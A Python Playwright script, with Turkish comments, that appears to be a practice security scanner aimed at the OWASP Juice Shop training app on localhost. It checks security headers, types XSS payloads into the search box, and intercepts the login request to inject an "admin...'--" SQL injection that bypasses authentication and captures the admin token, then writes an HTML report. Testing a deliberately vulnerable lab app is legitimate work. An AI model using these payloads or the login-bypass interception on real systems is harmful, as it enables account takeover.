import sys
import time
import json
import datetime
from playwright.sync_api import sync_playwright

class Renk:
    YESIL = '\033[92m'
    KIRMIZI = '\033[91m'
    SARI = '\033[93m'
    MAVI = '\033[94m'
    RESET = '\033[0m'

BASE_URL = "http://localhost:3000"

# --- RAPORLAMA İÇİN VERİ HAVUZU ---
# Bulduğumuz her açığı buraya atacağız
BULGULAR = []

XSS_PAYLOADS = [
    '<iframe src="javascript:alert(`xss`)">',
    '<script>alert("XSS")</script>'
]

def bulgu_ekle(kategori, detay, risk_seviyesi, kanit):
    """Bulunan zafiyeti rapor listesine ekler."""
    BULGULAR.append({
        "tarih": datetime.datetime.now().strftime("%H:%M:%S"),
        "kategori": kategori,
        "detay": detay,
        "risk": risk_seviyesi,
        "kanit": kanit
    })

def hosgeldiniz_kapat(page):
    try:
        if page.locator("button[aria-label='Close Welcome Banner']").is_visible():
            page.locator("button[aria-label='Close Welcome Banner']").click()
        if page.locator("a[aria-label='dismiss cookie message']").is_visible():
            page.locator("a[aria-label='dismiss cookie message']").click()
    except: pass

def baslik_analizi(page):
    print(f"\n{Renk.MAVI}[1] Güvenlik Başlıkları Analiz Ediliyor...{Renk.RESET}")
    basliklar = page.request.get(BASE_URL).headers
    
    if 'content-security-policy' in basliklar:
        print(f"{Renk.YESIL}[+] CSP Aktif.{Renk.RESET}")
        bulgu_ekle("Güvenlik Başlığı", "CSP (Content Security Policy) Mevcut", "Düşük (Güvenli)", "Header Var")
    else:
        print(f"{Renk.KIRMIZI}[!] CSP Bulunamadı! (Zafiyet Var){Renk.RESET}")
        bulgu_ekle("Güvenlik Başlığı", "CSP Başlığı Eksik", "Orta", "Header Yok")
        
    if 'strict-transport-security' in basliklar:
        print(f"{Renk.YESIL}[+] HSTS Aktif.{Renk.RESET}")
    else:
        print(f"{Renk.SARI}[!] HSTS Bulunamadı.{Renk.RESET}")
        bulgu_ekle("Güvenlik Başlığı", "HSTS Başlığı Eksik", "Düşük", "Header Yok")

def xss_modulu(page):
    print(f"\n{Renk.MAVI}[2] XSS Taraması Başlatılıyor...{Renk.RESET}")
    page.goto(f"{BASE_URL}/#/search")
    page.wait_for_load_state("networkidle")
    time.sleep(1)
    hosgeldiniz_kapat(page)

    # XSS Yakalayıcı
    def dialog_handler(dialog):
        msg = f"Mesaj: {dialog.message}"
        print(f"\n{Renk.KIRMIZI}[!!!] DİNAMİK XSS TESPİT EDİLDİ! ({msg}){Renk.RESET}")
        
        # Rapora Ekle
        bulgu_ekle("Reflected XSS", "Arama kutusunda JS kodu çalıştırıldı.", "Yüksek", msg)
        
        try: dialog.accept()
        except: pass

    try: page.remove_listener("dialog", dialog_handler)
    except: pass
    page.on("dialog", dialog_handler)

    try:
        search_icon = page.locator("mat-icon:has-text('search')").first
        if search_icon.is_visible():
            search_icon.click(force=True)
            time.sleep(0.5)

        search_input = page.locator("#searchQuery input")
        if not search_input.is_visible():
             page.locator("mat-icon:has-text('search')").first.click(force=True)

        payload = XSS_PAYLOADS[0]
        print(f"[*] Payload deneniyor: {payload}")
        search_input.fill("")
        search_input.type(payload, delay=50)
        search_input.press("Enter")
        time.sleep(1.5)

    except Exception as e:
        print(f"{Renk.SARI}[!] XSS Hatası: {e}{Renk.RESET}")

def sqli_modulu(page):
    """Network Interception ile SQL Injection"""
    print(f"\n{Renk.MAVI}[3] SQL Injection Taraması (Network Interception Modu)...{Renk.RESET}")
    
    page.goto(f"{BASE_URL}/#/login")
    page.wait_for_load_state("networkidle")
    time.sleep(1)
    hosgeldiniz_kapat(page)

    def handle_route(route):
        if "/rest/user/login" in route.request.url and route.request.method == "POST":
            print(f"{Renk.YESIL}    [->] Login paketi yakalandı! Payload enjekte ediliyor...{Renk.RESET}")
            sqli_data = {
                "email": "admin@juice-sh.op'--", 
                "password": "sifre_onemsiz"
            }
            route.continue_(post_data=json.dumps(sqli_data))
        else:
            route.continue_()

    page.route("**/rest/user/login", handle_route)

    try:
        print("[*] Forma geçerli veri giriliyor...")
        page.locator("#email").fill("test@test.com")
        page.locator("#password").fill("test12345")
        
        print("[*] Giriş butonuna basılıyor ve cevap bekleniyor...")
        
        with page.expect_response(lambda response: "/rest/user/login" in response.url and response.request.method == "POST") as response_info:
            page.locator("#loginButton").click()
        
        response = response_info.value
        status = response.status
        print(f"    [<-] Sunucu Durum Kodu: {status}")

        if status == 200:
             json_response = response.json()
             token = json_response.get('authentication', {}).get('token', 'Yok')
             
             print(f"{Renk.KIRMIZI}[!!!] SQL INJECTION %100 BAŞARILI! [!!!]{Renk.RESET}")
             
             # Rapora Ekle
             bulgu_ekle(
                 "SQL Injection (Login Bypass)", 
                 "Network Interception ile Admin hesabı ele geçirildi.", 
                 "KRİTİK", 
                 f"Token Alındı: {token[:15]}..."
             )
        else:
             print(f"{Renk.SARI}[-] Saldırı başarısız oldu.{Renk.RESET}")

    except Exception as e:
        print(f"[!] Hata: {e}")

def rapor_olustur():
    """Bulguları HTML formatında dosyaya yazar."""
    print(f"\n{Renk.MAVI}[4] Rapor Oluşturuluyor...{Renk.RESET}")
    
    tarih = datetime.datetime.now().strftime("%d-%m-%Y %H:%M")
    
    html_icerik = f"""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>Güvenlik Tarama Raporu</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 40px; background-color: #f4f4f9; }}
            h1 {{ color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }}
            .info {{ background: #ecf0f1; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
            table {{ width: 100%; border-collapse: collapse; box-shadow: 0 0 20px rgba(0,0,0,0.1); background-color: white; }}
            th, td {{ padding: 15px; text-align: left; border-bottom: 1px solid #ddd; }}
            th {{ background-color: #2c3e50; color: white; }}
            tr:hover {{ background-color: #f5f5f5; }}
            .risk-Yüksek, .risk-KRİTİK {{ color: white; background-color: #e74c3c; font-weight: bold; padding: 5px 10px; border-radius: 4px; }}
            .risk-Orta {{ color: white; background-color: #f39c12; font-weight: bold; padding: 5px 10px; border-radius: 4px; }}
            .risk-Düşük {{ color: white; background-color: #27ae60; font-weight: bold; padding: 5px 10px; border-radius: 4px; }}
        </style>
    </head>
    <body>
        <h1>Otomatik Zafiyet Tarama Raporu</h1>
        <div class="info">
            <p><strong>Hedef Site:</strong> {BASE_URL}</p>
            <p><strong>Tarama Tarihi:</strong> {tarih}</p>
            <p><strong>Test Eden:</strong> Playwright Otomasyon Botu</p>
        </div>
        
        <table>
            <thead>
                <tr>
                    <th>Saat</th>
                    <th>Kategori</th>
                    <th>Zafiyet Detayı</th>
                    <th>Kanıt (Proof)</th>
                    <th>Risk Seviyesi</th>
                </tr>
            </thead>
            <tbody>
    """
    
    for bulgu in BULGULAR:
        html_icerik += f"""
                <tr>
                    <td>{bulgu['tarih']}</td>
                    <td>{bulgu['kategori']}</td>
                    <td>{bulgu['detay']}</td>
                    <td><code>{bulgu['kanit']}</code></td>
                    <td><span class="risk-{bulgu['risk'].split()[0]}">{bulgu['risk']}</span></td>
                </tr>
        """
        
    html_icerik += """
            </tbody>
        </table>
        <p style="text-align: center; margin-top: 30px; color: #7f8c8d;">Bu rapor otomatik olarak oluşturulmuştur.</p>
    </body>
    </html>
    """
    
    dosya_adi = "Guvenlik_Raporu.html"
    with open(dosya_adi, "w", encoding="utf-8") as f:
        f.write(html_icerik)
    
    print(f"{Renk.YESIL}[+] Rapor başarıyla kaydedildi: {dosya_adi}{Renk.RESET}")

def main():
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()

        print(f"{Renk.MAVI}[*] Proje Başlatılıyor...{Renk.RESET}")
        baslik_analizi(page)
        xss_modulu(page)
        sqli_modulu(page)
        
        # Taramalar bitince raporu bas
        rapor_olustur()
        
        print(f"\n{Renk.MAVI}[*] İşlem Tamam. Tarayıcı 5sn sonra kapanacak.{Renk.RESET}")
        time.sleep(5)
        browser.close()

if __name__ == "__main__":
    main()